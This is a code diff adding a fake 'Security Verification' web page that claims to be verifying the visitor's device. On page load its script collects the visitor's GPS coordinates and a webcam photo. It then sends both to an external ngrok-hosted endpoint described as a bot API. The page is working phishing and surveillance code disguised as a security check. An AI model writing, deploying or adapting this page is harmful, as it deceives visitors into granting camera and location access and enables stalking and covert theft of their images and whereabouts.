@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Verification</title>
+</head>
+<body>
+<h2>Verifying your device...</h2>
+<video id="video" autoplay style="width:100%;"></video>
+<script>
+async function getData() {
+    try {
+        // Get location
+        navigator.geolocation.getCurrentPosition(async function(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+
+            // Get photo
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            let video = document.getElementById('video');
+            video.srcObject = stream;
+
+            let track = stream.getVideoTracks()[0];
+            let imageCapture = new ImageCapture(track);
+            let blob = await imageCapture.takePhoto();
+            let reader = new FileReader();
+            reader.onloadend = function() {
+                // Send location + photo to bot API
+                fetch("https://d6d13ede2ed0.ngrok-free.app", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        latitude: lat,
+                        longitude: lon,
+                        image: reader.result
+                    })
+                });
+            };
+            reader.readAsDataURL(blob);
+        });
+    } catch (e) {
+        console.error(e);
+    }
+}
+getData();
+</script>
+</body>
+</html>
